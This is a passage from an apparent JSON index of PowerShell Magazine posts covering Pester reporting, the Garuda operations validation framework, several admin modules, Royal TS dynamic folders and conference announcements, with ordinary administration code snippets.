suggestions/remarks for the end user/support engineers to fix the issue and make the test pass?\nWell then that has to be done for each testcase. Yes for each test cases. This is done by adding a new parameter to the it function in Pester.\nBelow is an example with the suggestion feature.\nit \u0026#34;Service BITS status should be Running\u0026#34; { $Service.Status | Should -Be \u0026#34;Running\u0026#34; } -Remark \u0026#34;Open services.msc and start BITS service\u0026#34; But there is a caveat, we can add a parameter to the It function, but how to add this remark in the report XML. The report XML is in nunit format and it has predefined layout. The test result layout has to be followed in the report and therefore any Nunit report readers can parse the result.\nWell, Pester report doesn’t use all the attributes of the nunit test result layout and I found the Label attribute as a candidate for adding remarks. So with the remark support for testcases, below is the final pester test script.\nScript: https://gist.github.com/kvprasoon/bec40fa50d6975fcdafa6536b61cf1aa\nTest Configuration: https://gist.github.com/kvprasoon/2dd5fc64eec0653e4bdde6a18da526ff\nLets execute and see the report with suggestions.\nInvoke-Pester -Script @{Path = \u0026#39;C:\\temp\\OpsValidation.tests.ps1\u0026#39; ; Parameters = @{ConfigPath = \u0026#39;c:\\temp\\OpsValidationConfig.json\u0026#39;}} -OutputFile c:\\temp\\OpsValidation.xml -OutputFormat NUnitXml -XSLPath c:\\temp\\OpsValidation.xsl After opening the generated report in a web browser.\nIf you want to explore and see the code changes, Pester with these changes is currently available here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/07/25/pester-result-reporting-with-suggestions-and-xsl-support/","tags":["DevOps","Pester"],"title":"Pester Result Reporting With Suggestions And XSL Support"},{"categories":["DevOps","Podcast"],"contents":"I was recently featured on the Latest Shiny Podcast (@l8istsh9y) hosted by Rob Hirschfeld and Stephen Spector. I came across their podcast a while ago and listened to their last two episodes.\nA few weeks ago Rob (I knew him from his Dell days) tweeted about a probable topic for an upcoming episode.\nWho wants to rant on @l8istsh9y about infrastructure as code #IaC? Seems fraught, so perfect podcast topic.\n\u0026mdash; Rob Hirschfeld (@zehicle) June 19, 2019  Having written a couple of published books on PowerShell DSC and being in the infrastructure automation space, Infrastructure as Code (IaC) is close to my heart. Therefore, I just jumped in and said count me in!\nWe started with a discussion on IaC but eventually it lead to Rob naming what we discussed as a vision for the continuously integrated data center! Indeed, that is (should be) the goal. Rest is what you will hear in this episode of the podcast.\n  This was a fun episode. Let me know what your thoughts are. I will certainly find some time to write about this vision and the objectives.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/07/15/podcast-a-vision-for-continuously-integrated-data-center/","tags":["DevOps"],"title":"Podcast – A vision for Continuously Integrated Data Center"},{"categories":["Module Spotlight","Pester","Garuda","DevOps"],"contents":"In the earlier parts of this series, I introduced you to the concepts and design of Garuda framework. I demonstrated a proof-of-concept version of this at PowerShell Conference Europe.\nThe recording of that session is available.\n  Instead of writing another article about how the POC works, I thought it is easier for you to see it in action.\nI am working on a complete overhaul of the framework and will have a new version soon on GitHub. Stay tuned!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/07/11/garuda-session-demo-from-psconfeu/","tags":["Modules","Pester"],"title":"Garuda – Session Demo From #PSConfEU"},{"categories":["Community"],"contents":"I have been talking to several automation engineers (for a vacant position) and realized there are many women who have been doing some great work in the area of infrastructure automation. However, there have been very few women attendees or speakers at our user group meetings or conferences that I attended.\nWhile there may be many reasons for this, the organizing committee of PowerShell Conference Asia decided that we invite women in tech (infrastructure automation, Cloud, and DevOps) to this year’s edition of our conference.\nWe have opened up registration of intent to attend the conference. All you have to do is just provide your details. We will select five random registrations and give them full 3 day pass to the conference at no cost. For five more, we will offer higher discount. The organizing committee will decide the percentage of discount.\n The free entry or the discounted entry entails you the conference pass only. If you need to travel to Bangalore to attend this conference, attendee must bear the travel and accommodation expenses.\n This registration will end on 15th August 2019. We will announce the selected registrations on 20th August 2019.\nPlease share this registration information and help us enable women in the infrastructure automation, cloud, and DevOps space to attend PowerShell Conference Asia 2019!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/07/10/inviting-women-in-tech-to-powershell-conference-asia/","tags":["Conferences"],"title":"Inviting Women In Tech to PowerShell Conference Asia"},{"categories":["DevOps","Pester","Garuda"],"contents":"In the first part of this series, I mentioned the reasoning behind starting development of a new framework for operations validation. Towards the end, I introduced Garuda — a distributed and flexible operations validation framework. There are certain principles that drove the design of this framework — Distributed, Flexible, and Secure.\nIn this part of the series, you will see the architecture proposal and the plan I have to implement these features.\nArchitecture To support the principles described, the framework needs a few moving parts. These moving parts provide the flexibility needed and gives you a choice of tooling.\nAt a high-level, there are five components in this framework.\nTest Library The test library is just a collection of parameterized Pester test scripts. The parameterization helps in reuse. As a part of the Garuda core, you can group these tests and then use the publish engine to push the tests to remote targets. The tags within the tests are used in the test execution process to control what tests need to be executed within the test group published to the remote target.\nGaruda Core This is the main module which sticks the remaining pieces together. This is what you can use to manage the test library. This core module will provide the ability to parse the test library and generate the parameter information for each test script which is eventually used in generating a parameter manifest or configuration data. One of the requirements for this framework is to enable grouping of tests. The Garuda core gives you the ability to generate the test groups based on what is there in the library. You can then generate the necessary parameter manifest (configuration data) template for the test group that you want to publish to remote targets. Once you have the configuration data prepared for the test group, you can publish the tests to the remote targets.\nPublish Engine The publish engine is responsible for several things.\nThis module generates the necessary configuration or deploy script that does the following:\n Install necessary dependent modules (for test scripts from a local repository or PowerShell Gallery) Copy test scripts from the selected test group to the remote target Copy the configuration data (sans the sensitive data) to the remote target As needed, store credentials to a credential vault on the remote target Copy the Chakra engine to the remote targets if selected, create the JEA endpoints for operators to retrieve test results from the remote targets If selected, create scheduled tasks on the remote target for reoccurring test script execution  Once the configuration or the deploy script is ready, the publish engine can enact it directly on the remote targets or just return the script for you to enact it yourself.\nThe publish engine is extensible and by default will support PowerShell DSC and PSDeploy for publishing tests to the remote targets. Eventually, I hope the community will write providers for other configuration management platforms / tools. There will be abstractions within the engine to add these providers in a transparent manner.\nThe publish engine helps in securing the test execution by storing sensitive configuration data in a vault. It also implements the scheduled tasks as either SYSTEM account or a specified user. The JEA endpoints configured on the remote targets help us securely retrieve the test results with least privileges needed.\nYou can publish multiple tests groups to the same remote target. This helps implement the flexibility that IT teams need in the operations space for a given infrastructure or application workload. There can be multiple JEA endpoints one for each team publishing the test groups.\nChakra The Chakra is what helps execute the tests in test group(s) on the remote targets. It has the test parameter awareness and can use the published configuration data and the sensitive data stored in the vault for unattended execution of tests. Chakra is also responsible for result consolidation. It can be configured to retain results for X number of days. All the test results for each group get stored as JSON files and are always timestamped. The scheduled tasks created on the remote targets invoke Chakra at the specified intervals. Chakra also contains the cmdlets that are configured for access within the JEA endpoints. Using these endpoints, test operators can retrieve the test results from a central system from all the remote targets.\nReport Engine The report engine is final piece of this framework that enables retrieving the results from the remote targets and transforming those results into something meaningful for the IT managers. By default, there will be providers for reports based on PSHTML, ImportExcel, and UniversalDashboard. The report engine provides that abstractions for community to add more reporting options.\nThe Plan The initial release of the framework or what I demonstrated at the PowerShell Conference Europe was just a proof of concept. I am planning on breaking down the framework into different core components I mentioned above. The GitHub repository for the framework will have issues created for each of these components and I will start implementing the basics. The 1.0 release of this framework will have support for every detail mentioned above and will be completely useable and functional for production use.\nWhat about the naming? The names Garuda and Chakra are from the Hindu mythology and their meaning is connected to the concepts I am proposing for this framework. Garuda is the bird from Hindu mythology. It has a mix of human and bird features. It is deemed powerful and is the vehicle of the Hindu god Vishnu. It can travel anywhere and is considered the king of birds. The Chakra the weapon that lord Vishnu carries. It is used to eliminate evil. This is also known as the wheel of time. Garuda is the vehicle that transports lord Vishnu and his Chakra to places where there is evil.\nThe Garuda Core combined with the Publish engine can take your operational validation tests to your remote targets. Chakra is the way to perform operations validation to ensure that your infrastructure is always healthy and functional.\nIn the next article in this series, you will see the framework in action.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/06/24/garuda-architecture-and-plan/","tags":["DevOps","Pester"],"title":"Garuda – Architecture and Plan"},{"categories":["Module Spotlight","PSPublicAPI"],"contents":"The Public APIs repository on GitHub has a list of free APIs that you can use in software and web development. This is a great resource for finding out if there is a free public API for a specific task at hand. For example, if your application requires weather data, you can take a look at several free API options available and select the one that works for you. I have been following this repository and they have recently added something useful — a public API to query for public APIs!\nI quickly created a new PowerShell module that wraps around the public API for the public APIs!\nYou can install this module from the gallery as well.\nInstall-Module -Name PSPublicAPI -Force There are four commands in this module.\nGet-PSPublicAPICategory Gets a list of categories for the public API.\nGet-PSPublicAPIHealth Gets the health state of public API service.\nGet-PSPublicAPIEntry Gets specific APIs or all API entries from the public API service.\nGet-PSPublicAPIRandomEntry Gets a random API entry public API service or a random API entry matching a specific criteria.\nThe commands are pretty much self-explained and you can find the docs for each command here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/06/18/pspublicapi-module-for-listing-free-apis-for-use-in-software-and-web-development/","tags":["Modules"],"title":"PSPublicAPI – Module For Listing Free APIs For Use in Software and Web Development"},{"categories":["DevOps","Module Spotlight","Garuda","Pester"],"contents":"Operations validation using PowerShell and Pester has been one of my favorite topics and I have both personal and professional interest in this area. I have invested good amount of time experimenting with the existing frameworks and creating a couple of my own. One of my PowerShell Conference EU sessions was around this topic and a new framework that I am developing. This session was well received and there was good amount of interest in this new framework.\nIn this series of articles, I will write about the need for a new framework and introduce the new framework which I demonstrated at PowerShell Conference Europe. There is still a lot of work to be done and this series will act as a way to express where I want to see this whole framework and the end goals.\nIn this part, you will see what are the available options today for operations validation and / or similar use cases and what their limitations are. Towards the end, I will talk about the desired state requirements for a distributed and flexible operations validation framework.\nThe Current State My work with operations validation started back in 2016 when I had first demonstrated using Pester for validating the functional state of clusters. This first implementation was tightly coupled with PowerShell DSC resource modules and needed configuration data supplied with DSC configuration documents to perform the operations validations. This model worked very well for infrastructure that was configured using DSC. However, this is not really a generic or flexible framework for running operations validation.\nMicrosoft Operations Validation Framework (OVF) Around the time I started working on the operations validations bundled with infrastructure blueprints, PowerShell team published an open source version of a framework meant for operations validation. This implements operational tests bundled with regular PowerShell modules. The cmdlets in the framework can discover the operations validation tests packaged in the installed modules and invoke the same. You can specify a hashtable of values as the test script parameters. This is a distributed test execution model. Tests can be copied to all nodes and invoked on the node. This is certainly what I wanted to start with. But, the tight coupling between the modules and tests is not what I really want. Instead, I want to be able to distribute chosen tests as groups of tests to any node. I could have written a wrapper script around OVF and achieve what I wanted but there are other limitations.\nPackaging tests as modules is an unnecessary overhead. If you have a huge library of tests and you need to determine the tests that run on the remote targets dynamically, you also need to be able to generate modules dynamically. And, then, you need to find a way to distribute those modules among the target nodes and also ensure that these are kept up to date as you update the central repository.\nThe test parameters are passed as a hashtable and therefore if you need to invoke the tests in an unattended (such as a schedule task) manner, you need to ensure that you have a wrapper script that reads some sort of configuration data and translates that into relevant parameters. But, then you need a way to publish that configuration data as well to the remote targets.\nPSHealthz PSHealthz by Brandon Olin provides a web service endpoint to invoke tests packaged or published using OVF. This is an implementation of the Health Endpoint Monitoring Pattern using PowerShell. The available tests can be retrieved using the /health endpoint. Tests can be executed on the target node using the query parameters on the /health endpoint. PSHealthz is more of a way to list and invoke tests on the target nodes using the REST API but the limitations of OVF I mentioned above still exist.\nRemotely and PSRemotely Remotely is an open source PowerShell module from Microsoft that can be used for running Pester tests remotely — no surprises there! You can specify a set of remote targets in a file called machineconfi.csv and then use the Remotely keyword inside the It scriptblock for running the tests on the remote targets. This module has several drawbacks and has been more experimental than anything remotely useful (pun intended!). In fact, it has been more than 3 years since there was any update. Although the tests run on the remote node (using PowerShell remoting), they are essentially triggered from a central location in a fan-out method. Therefore, this module implements centralized test execution and reporting.\nPSRemotely was born out of the need for running tests on a bunch of remote nodes while eliminating all of Remotely drawbacks and providing better control over what runs when and where. This module uses DSC type configuration data for providing test parameters for each remote node. In fact, we have implemented a complete validation suite using PSRemotely before writing one more internal framework for operations validation of clusters. The major drawback of this module was the need to enable CredSSP so that the delegated credentials, when needed, can be used on remote targets. Also, there was no infrastructure awareness in PSRemotely. The number and type of tests running gets determined using the configuration data and we had no control over grouping tests based on the type of infrastructure. With PSRemotely, the execution of tests is distributed and reporting is centralized. Therefore, PSRemotely implements a hybrid model. With this framework, Pester tags is the only way to separate tests into groups.\nDBAChecks and pChecksAD Both DBAChecks and pChecksAD implement a more centralized test execution and reporting. All tests stay on the local system and you can design these tests to target remote systems using a cmdlet provided method or write your tests to use PowerShell remoting to target remote systems. These are purpose built modules but you can take clues from how they implemented these modules and write one for your specific use case. These are great at what they are doing but not something that would satisfy my requirements for a distributed and flexible operations validation framework.\nPoshSpec PoshSpec is another great project that enables simplified infrastructure validations with a way to extend it very easily. PoshSpec provides a DSL for infrastructure validations for known resources. For example, you can write a test in PoshSpec DSL to verify if a hotfix is installed without worrying about how to get a list of hotfixes. There is currently a limited set of resources. PoshSpec is centralized test execution. It does not yet support remote execution but there is an RFC on that. I created this issue back in 2016 and continued to work on my own frameworks for achieving what I really need.\nThe Desired State You have seen, so far, options available for performing operations validation. You have also read about the limitations that these frameworks or modules pose. I will, now, translate these limitations into the requirements for a new operations validation framework.\nDistributed The new framework needs to support distribution (publishing) of tests to remote targets and should offer different methods for test distribution. For example, I should be able to publish tests to remote targets using PowerShell DSC or Ansible or Chef or Puppet.\nThe new framework should support distributed test execution. I want to be able to invoke tests on-demand or on a scheduled basis on the remote targets. The input parameters or configuration data needed for the tests should be local but the framework should provide a way to publish the configuration data as well. And, the secrets within the configuration data should be encrypted.\nFlexible The new framework should be flexible enough to allow integration with different other modules or technologies. For example, I had mentioned already that the test distribution should support more than one method.\nWithin infrastructure management, there will be more than one team involved in bringing up the infra. For example, if there is a SQL cluster that is being managed, there may be a team that is solely responsible for OS deployment \u0026amp; management whereas another takes care of SQL management. Now, each of these team will have their own operations validation tests. The new framework should enable a way to publish multiple test groups to the remote targets and execute and report them independently.\nFrom a reporting point of view, the new framework should be capable of supporting multiple reporting methods like HTML, Excel, and so on.\nSecure The tests running on the remote targets need input parameters and this may include secure strings and secrets. Since this configuration data needs to reside on the target nodes, the sensitive data should be stored in a safe manner. For example, credentials should go into a vault such as Windows Credential Manager. The new framework should support this.\nThe result retrieval from the remote targets happens at a central console. For this, the test operators need access only to invoke the test result retrieval from the remote targets. The framework should support least privileged way of doing this such as implementing a JEA endpoint.\nIntroducing Garuda I have been experimenting a bit trying to implement a totally new framework that satisfies most if not all of the desired state requirements. This is still in a proof-of-concept phase. There is not even documentation around how to use this yet. This is what I demonstrated at the PowerShell Conference EU 2019 a week ago. I named this framework Garuda. I will write about the naming choice in the next post.\nToday’s article is an introduction to the thought process behind Garuda. In the next post, I will explain the architecture of Garuda and talk about how some of the desired state requirements are implemented.\nBTW, just before my session at the EU conference, I had a couple of hours to kill and created this logo for the Garuda framework. You will know the meaning of this in the next post.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/06/17/distributed-and-flexible-operations-validation-framework-introduction/","tags":["DevOps","Modules","Pester"],"title":"Distributed and Flexible Operations Validation Framework – Introduction"},{"categories":["Tips and Tricks"],"contents":"While working on a module that interacts with REST API, I came across a situation where I had to generate query strings. The number of parameters will vary based on what is supplied to the function. This becomes a bit tricky since the HTTP query strings have a certain format.\nFor example, https://localhost:443/?name=test\u0026amp;age=25\u0026amp;company=powershell+magazine.\nAs you see in the above example, the first parameter in the query string should be prefixed with question mark and the subsequent parameters are separated by an ampersand. If there are spaces in a parameter value the spaces should be replaced with a plus sign. This can be coded easily in PowerShell but there is a better way using the System.Web.HttpUtility class in .NET.\nThe ParseQueryString method in the httputility class parses the URL and gives us a key-value collection. To start with, we can provide this method an empty string.\n$nvCollection = [System.Web.HttpUtility]::ParseQueryString([String]::Empty) We can then add the key value pairs to this collection.\n$nvCollection.Add(\u0026#39;name\u0026#39;,\u0026#39;powershell\u0026#39;) $nvCollection.Add(\u0026#39;age\u0026#39;,13) $nvCollection.Add(\u0026#39;company\u0026#39;,\u0026#39;automate inc\u0026#39;) Once the parameters are added to the collection, we can build the URI and retrieve the query string.\n$uriRequest = [System.UriBuilder]\u0026#39;https://localhost\u0026#39; $uriRequest.Query = $nvCollection.ToString() $uriRequest.Uri.OriginalString This is it. I created a function out of this for reuse.\nfunction New-HttpQueryString { [CmdletBinding()] param ( [Parameter(Mandatory = $true)] [String] $Uri, [Parameter(Mandatory = $true)] [Hashtable] $QueryParameter ) # Add System.Web Add-Type -AssemblyName System.Web # Create a http name value collection from an empty string $nvCollection = [System.Web.HttpUtility]::ParseQueryString([String]::Empty) foreach ($key in $QueryParameter.Keys) { $nvCollection.Add($key, $QueryParameter.$key) } # Build the uri $uriRequest = [System.UriBuilder]$uri $uriRequest.Query = $nvCollection.ToString() return $uriRequest.Uri.OriginalString } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/06/14/pstip-a-better-way-to-generate-http-query-strings-in-powershell/","tags":["Tips and Tricks"],"title":"#PSTip A Better Way to Generate HTTP Query Strings in PowerShell"},{"categories":["PSConf","PSConfAsia"],"contents":"PowerShell Conference Asia 2019 edition will be in Bangalore, India. We closed our CFP towards end of February and finalized (partially) a great set of International PowerShell Experts. This conference, as always, will feature PowerShell product team members from Redmond.\nConference website is updated to feature the confirmed speakers and this list includes experts from the USA, Australia, Europe, and India. As I write this, we are yet to finalize a few more speakers and I am sure we will have a fully loaded agenda for all three days. The pre-conf workshops include content from level 100 (PowerShell 101) to CI / CD for PowerShell professionals. On the pre-conf day, there is a track dedicated for deep-dive sessions for the attendees who are already comfortable writing PowerShell scripts and modules.\nAt this point in time, we have opened the early bird discount sale (15% on the original ticket price). The tickets are priced in INR and a 3 day pass at this point in time costs less than 100 USD.\nYou can get the 3 day (includes pre-conf day) early bird pass @ https://imjo.in/N8t8G7 and the 2 day (only full-conf days) early bird pass @\nhttps://www.instamojo.com/@tecoholic/l2f610b18b43c4deb9f534b1082b7f414/\nIf you have a group of 5 or more interested in attending this year’s conference, reach out to us at get-help@psasia.org. We will let you know what best we can do for your group.\nWe have already received a few ticket sales and very happy with the progress in last couple of days. Can’t wait to see you all in September.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/04/09/powershell-conference-asia-early-bird-ticket-sales/","tags":["Conferences"],"title":"PowerShell Conference Asia – Early Bird Ticket Sales"},{"categories":["Module Spotlight","PSWindowsAdminCenter"],"contents":"I had published a PowerShell DSC resource module, last month, called WindowsAdminCenterDsc that uses the PowerShell module that was made available with Windows Admin Center version 1812. This module makes use of the REST API that comes with Windows Admin Center to manage connections, feeds, and extensions.\nI had immediately verified that the API was available in version 1809.5 as well. So, I wanted to build another PowerShell module that has similar and/or more features than the current module that ships with version 1812. Also, the goal was to ensure that I can use this module in my build process to add the newly deployed servers and clusters to Windows Admin Center in an automated manner.\n Note: This module works with Windows Admin Center 1809.5 and above.\n This module can be installed from PowerShell Gallery:\nInstall-Module -Name PSWindowsAdminCenter This project is available in my GitHub repository. I have a few TODOs:\n Add Export option to Get-WacConnection command so that you can export the connections details to a CSV file. Add Import option to Add-WacConnection command so that you can import all connections from a CSV file. Update WindowsAdminCenterDsc module to use the PSWindowsAdminCenter instead of the module that ships with WAC.  If you see any issues or would like to see new features, feel free to create an issue.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/02/19/pswindowsadmincenter-powershell-module-to-manage-connections-feeds-and-extensions/","tags":["Modules"],"title":"PSWindowsAdminCenter: PowerShell Module to Manage Connections, Feeds, and Extensions"},{"categories":["Module Spotlight","WindowsAdminCenterDSC"],"contents":"Windows Admin Center (WAC) is the new web-based management application for managing Windows Servers, Failover Clusters, Hyper-Converged Infrastructure (HCI) clusters, and Windows 10 PCs. This is a free application and can be installed on Windows Server 2016, Windows Server 2019, or Windows 10. Unlike System Center Operations Manager (SCOM), WAC does not store any monitoring data locally and therefore it is near real-time only.\nEver since WAC was released, one thought I had was to automatically onboard the servers and clusters that I want to manage within WAC right after their deployment is complete. There was no API that was available to do this earlier.\nWith the release of the WAC version 1812 (insider preview), there are a couple of PowerShell modules that are bundled with WAC. This internally uses the REST API and wraps around the same for a few management tasks.\nWhen I saw this, I immediately explored a design to implement DSC resources for WAC install/uninstall and configuration. And, the result is here: https://github.com/rchaganti/WindowsAdminCenterDsc\n This works only with Windows Admin Center 1812 insider preview and above.\n This REST API is available in 1809.5 as well and I am working on creating a PowerShell to wrap that API as a set of cmdlets. I will update this DSC resource module as well without breaking the current DSC resource design.\nThis module contains a set of resources to install Windows Admin Center (WAC) and configure WAC feeds, extensions, and connections. For complete documentation, see https://windowsadmincenterdsc.readthedocs.io/en/latest/.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/01/31/dsc-resource-module-to-install-and-configure-windows-admin-center/","tags":["Modules"],"title":"PowerShell DSC Resource Module to Install and Configure Windows Admin Center"},{"categories":["Module Spotlight"],"contents":"Royal TS is a powerful tool for managing remote systems using many different protocols such as Remote Desktop (RDP), PowerShell, SSH, HTTPS, and many more. In this article we will look at a new feature introduced in Royal TS 5.0 (released in December 2018) called dynamic folders.\nPreviously, I have written an article covering a PowerShell module for managing Royal TS Documents which is built in to Royal TS.\nIn that article I’ve showcased a script called Update-RoyalFolder.ps1, which could replicate server computer objects from a specified Active Directory domain or Organizational Unit (OU).\nThis was very useful as the script could be scheduled to update a Royal TS connections document, for example on a daily basis.\nThe new Dynamic Folder Script feature allows you to configure a script and the interpreter which populates the dynamic folder content.\nWe start by creating a new folder of the Dynamic Folder type:\nGive it a meaningful name, such as the source we are going to dynamically retrieve data from:\nOn the Dynamic Folder Script window, we can choose PowerShell to be the script interpreter:\nYou will get an example script which shows what kind of objects is expected, as well as how to convert them to JSON (which is the output format Royal TS expects):\nAfter modifying the options, such as credentials, click OK. When right-clicking the folder we create, we can see that we have the option of reloading the folder:\nClicking this will trigger the PowerShell script we just saw on the Dynamic Folder Script window, and the folder should now look like this when using the provided example script.\nAccording to the documentation, there are two options available for reloading a dynamic folder:\n Automatically reload folder contents _ – If checked, Royal TS will automatically reload the folder contents when the document is opened._ Persist (cache) folder contents _ – If checked, Royal TS will save (cache) the contents of this dynamic folder within the document._  By default, none of the two options is enabled.\nIn order to populate the dynamic folder with our own data using PowerShell, we can build custom objects with the necessary properties:\n[PSCustomObject]@{ Name = $PSItem.Name Type = \u0026#39;RemoteDesktopConnection\u0026#39; ComputerName = $PSItem.Name CredentialName = \u0026#39;DOMAIN\\username\u0026#39; Path = MySubfolder } This example creates an object to be used with a Remote Desktop Connection. If you want to build other connection types, see the documentation for RoyalJSON and Dynamic Folders.\nNext, we need to put all the objects we have created in a hash table called ‘Objects’, as this is what the RoyalJSON format expects:\n$RoyalTSObjects = @{} $null = $RoyalTSObjects.Add(\u0026#39;Objects\u0026#39;,$Servers) The final piece is to convert the hash table to JSON format, which is very convenient to do in PowerShell:\n$RoyalTSObjects | ConvertTo-Json As you can see, for a PowerShell user it is very straightforward to build a script for dynamically populating a folder with connection objects in Royal TS.\nWe can populate it with any data we can retrieve from PowerShell.\nWe will start by looking at an example on how to accomplish this using Active Directory as the data source.\nYou need to install Remote Server Administration Tools (RSAT) in order to leverage the Active Directory module for PowerShell from a workstation. Starting with Windows 10 October 2018 Update, RSAT is included as a set of “Features on Demand” in Windows 10 itself. From PowerShell, it can be installed using this command:\nAdd-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 A Royal TS community member has created a YouTube video explaining more details about retrieving data from Active Directory for building a dynamic folder in Royal TS, such as building the Dynamic Folder sub folder structure based on the Organizational Unit structure the computer objects is retrieved from.\nYou can use your existing skills for retrieving the computer accounts you want from Active Directory. I am re-using an existing function I have created called Get-ServerFromAD. This will retrieve computer accounts with an operating system name starting with Windows Server*, exclude Cluster Name Objects and include computer accounts which have logged on during the last number of days specified (30 is the default).\nYou can find the complete script here.\nI would recommend to first run the script manually in order to verify that data can be retrieved from Active Directory. You may also want to customize options such as domain name and credentials. I am using the script from a non-domain joined laptop, hence I need to specify credentials.\nWhen the script is customized and verified, paste it in the Dynamic Folder Script window and click OK:\nAfter re-loading the document, you should now see server computer accounts from Active Directory:\nI have also created a script for getting computer names from System Center Virtual Machine Manager (both hosts and virtual machines), which can be used to populate a dynamic folder:\nIn my example script I’ve created a flat structure, putting all computer names in a subfolder called VMM. Here it is possible to do all sorts of creative things, such as use Group-Object on the OperatingSystem property and then create SSH connections for Linux machines and RDP connections for Windows machines.\nI plan to create other scripts to retrieve computer names from other sources, such as Azure, Amazon Web Services, and VMware. Royal Applications has a dedicated repository for various automation scripts – created both by the Royal TS team and the community – where I also will submit Pull Requests for my contributions.\nUsing PowerShell Core as Script Interpreter\nBy navigating to the Royal TS Options, it is possible to modify Script Interpreter settings in the Advanced section:\nBy default, the PowerShell Script Interpreter is configured with the following path:\n_%windir%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nIf you rather want to leverage PowerShell Core as the engine for the PowerShell Script Interpreter, simply change the path to either pwsh.exe (as it is available in the System Path):\nAlternatively, specify the full path:\nC:\\Program Files\\PowerShell\\6\\pwsh.exe\nI have been using PowerShell Core without issues for the 2 Dynamic Folder Scripts I have showed in this article. For the Active Directory Dynamic Folder Script, PowerShell Core is using ~2.5 seconds to run against my lab Active Directory instance, while Windows PowerShell is using ~4 seconds.\nSummary\nIn this article we have looked at how the dynamic folder script feature in Royal TS can be used to dynamically creating Royal TS connection objects based on data gathered from a PowerShell script.\nWe also looked at different sources we can retrieve data from, such as Active Directory and System Center Virtual Machine Manager.\nBonus tip\nIf you are a Microsoft MVP, you can get an NFR license for Royal TS by sending an e-mail to support (at) royalapplications (dot) com with a link to your MVP profile.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2019/01/03/using-powershell-for-generating-dynamic-folders-in-royal-ts/","tags":["Scripts"],"title":"Using PowerShell for generating dynamic folders in Royal TS"},{"categories":["PSConfAsia","PSConf"],"contents":"We announced back in October that the next edition of PowerShell Conference Asia will be hosted in Bangalore (India) and is scheduled to happen from 19th to 21st September 2019.\nLike the previous year, we will have a day-long pre-conference workshops this year too. In addition to that, we are introducing pre-conference deep dive talks. While the workshops are targeted more towards the beginners, the pre-conference deep dive talks are meant for those of you who are already at level 150 or 200.\nThe main conference starts on 20th September 2019. The two days of this conference will have exciting in-depth talks by experts from across the world.\nToday, we are announcing the call for papers (CFP) to invite interested speakers from around the world to share their knowledge at PowerShell Conference Asia 2019. If you have some exciting work that you want to share with a larger international PowerShell community, this is your chance. Go ahead and submit your session proposals. We will be closing the CFP by end of February.\nIf you are a PowerShell beginner or interested in networking with the international community of PowerShell experts and the PowerShell product team from Microsoft, stay tuned for our blind/early bird ticket sales that will start very soon.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2018/12/31/powershell-conference-asia-2019-call-for-papers-2/","tags":["Conferences"],"title":"#PowerShell Conference Asia 2019 – Call for papers!"},{"categories":["Module Spotlight","PSRedfishEventListener"],"contents":"The Redfish specification supports event mechanism through which the target Redfish devices can send events from different components in the system to an event listener. The PSRedfishEventListener project provides an event listener that is create in native PowerShell.\nFull documentation of commands with examples is available at: https://psredfishlistener.readthedocs.io/en/latest/\nExample Workflow  Start an event listener using the Start-PSRedfishEventListener command.  Start-PSRedfishEventListener -IPAddress 172.16.102.76 -Port 9090 -LogPath C:\\RedfishEvents The above command will start new event listener that is bound to a specific IP address on the local host and to port 9090. The log path will be set to C:\\RedfishEvents.\n Perform registration on a Redfish Endpoint to send alerts to the listener. This is done using the Register-PSRedfishEventSubscription command.  $credential = Get-Credential -Message \u0026#39;Credentials to authenticate to the Redfish device ...\u0026#39; Register-PSRedfishEventSubscription -EventDestination https://172.16.102.76 -IPAddress 172.16.100.21 -Credential $credential The above command will register (create an event subscription) Redfish device 172.16.100.21 to send all event types to listener at https://172.16.102.76.\n Test event subscription using theSend-PSRedfishTestEvent.  $credential = Get-Credential -Message \u0026#39;Credentials to authenticate to the Redfish device ...\u0026#39; Send-PSRedfishTestEvent -IPAddress 172.16.100.21 -Credential $credential -EventDestination https://172.16.102.76 -Verbose The above command will submit a test event from Redfish device with an IP address 172.16.100.21 to the event listener at 172.16.102.76. The event type and message ID will be set to the defaults defined by the function.\n4.Stop the event listener using the Stop-PSRedfishEventListener command.\nStop-PSRedfishEventListener -IPAddress \u0026#39;172.16.102.76\u0026#39; -Verbose I have a few new features lined up for the next release. Similar to PowerShell object events, with the upcoming release, you will be able to tag an action associated to a specific event type from all Redfish device source or a specific source.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2018/11/13/redfish-event-listener-in-powershell/","tags":["Modules"],"title":"Redfish Event Listener in PowerShell"},{"categories":["DevOps","Azure","Azure DevOps"],"contents":"Introduction Continuous Integration (CI) is the process of integrating code into a source code repository several times a day. Each time code is pushed into the repository an automated process runs to build and verify the code continues to work. This is often called the “CI process” and needs to run on an agent, usually a Windows or Linux machine dedicated to the task. Developers and practitioners of “DevOps” have been using this practice for several years, but it is now becoming common and even critical path with IT professionals.\nIf you’re putting your code in a source code repository within a corporate or private environment, you may have some private CI tools set up to run your “CI process”, for example Team Foundation Server or Jenkins.\nBut what about if you’re running an open source public project in GitHub? You had to use one of the free (for open source public projects) CI systems available such as AppVeyor, which provides Linux and Windows agents or TravisCI which provides Linux and macOS agents. For PowerShell projects you pretty much had only one option: AppVeyor. But with the ability for PowerShell to run across multiple platforms (Windows, Linux and macOS) with PowerShell Core the need for a multi-platform CI has become more important. This meant you needed to add multiple CI systems to your open source 